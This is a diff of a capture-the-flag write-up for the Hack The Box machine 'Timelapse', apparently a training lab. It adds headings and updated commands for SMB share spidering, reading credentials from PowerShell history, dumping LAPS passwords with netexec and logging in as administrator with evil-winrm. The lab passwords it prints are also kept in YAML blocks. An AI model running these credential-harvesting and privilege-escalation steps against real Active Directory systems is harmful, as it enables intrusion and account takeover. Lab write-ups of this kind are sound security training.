@@ -13,17 +13,23 @@
 
 #### Skills Learned
 
-- ****
-- ****
+- **Public SMB Share**
+- **Credentials Harvesting**
+- **Cracking Protected Files**
+- **LAPS Privilege Escalation**
 
 #### Tools Used
 
 Linux:
 - `nmap`
-- `msfvenom`
-- `msfconsole`
 - `netexec`
+- `impacket-smbclient`
+- `zip2john`
+- `pfx2john`
+- `john`
 - `evil-winrm`
+- `openssl`
+Windows:
 - `net.exe`
 
 #### Machine Writeup
@@ -122,6 +128,8 @@ SMB         10.129.227.113  445    DC01             Shares          READ
 SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
 ```
 
+**Public SMB Share**
+
 ```
 ┌──(nabla㉿kali)-[~]
 └─$ netexec smb timelapse.htb -u 'guest' -p '' -M spider_plus
@@ -161,6 +169,8 @@ Type help for list of commands
 
 winrm_backup.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
 ```
+
+**Cracking Protected Files**
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -256,6 +266,8 @@ Info: Establishing connection to remote endpoint
 24003*************************** 🚩
 ```
 
+**Credentials Harvesting**
+
 ```
 *Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
@@ -269,6 +281,15 @@ invoke-command -computername localhost -credential $c -port 5986 -usessl -
 SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
+```
+
+```yaml
+credentials:
+    username: timelapse.htb/svc_deploy
+    password: "E3R$Q62^12p7PLlC%KWaxuaV"
+    protocol: winrm
+    host: DC01.timelapse.htb
+    port: 445,5985
 ```
 
 ```
@@ -306,28 +327,30 @@ Local Group Memberships      *Remote Management Use
 Global Group memberships     *LAPS_Readers         *Domain Users
 ```
 
-```
-┌──(nabla㉿kali)-[~]
-└─$ 
-```
+**LAPS Privilege Escalation**
 
 ```
 ┌──(nabla㉿kali)-[~]
-└─$ 
-```
-
-```
-┌──(nabla㉿kali)-[~]
-└─$ netexec smb timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps
+└─$ netexec ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb --module laps
 
 [SNIP]
 
-SMB         10.129.227.113  445    DC01             [-] DC01\administrator:f4]W2[hO4z-H$1;jw]UW+@a7 STATUS_LOGON_FAILURE
+LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
+LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:f4]W2[hO4z-H$1;jw]UW+@a7
+```
+
+```yaml
+credentials:
+    username: timelapse.htb/administrator
+    password: "f4]W2[hO4z-H$1;jw]UW+@a7"
+    protocol: winrm
+    host: DC01.timelapse.htb
+    port: 445,5985
 ```
 
 ```
 ┌──(nabla㉿kali)-[~]
-└─$ evil-winrm -i timelapse.htb -u Administrator -p 'f4]W2[hO4z-H$1;jw]UW+@a7' --ssl
+└─$ evil-winrm -i timelapse.htb -u administrator -p 'f4]W2[hO4z-H$1;jw]UW+@a7' --ssl
 
 [SNIP]
 
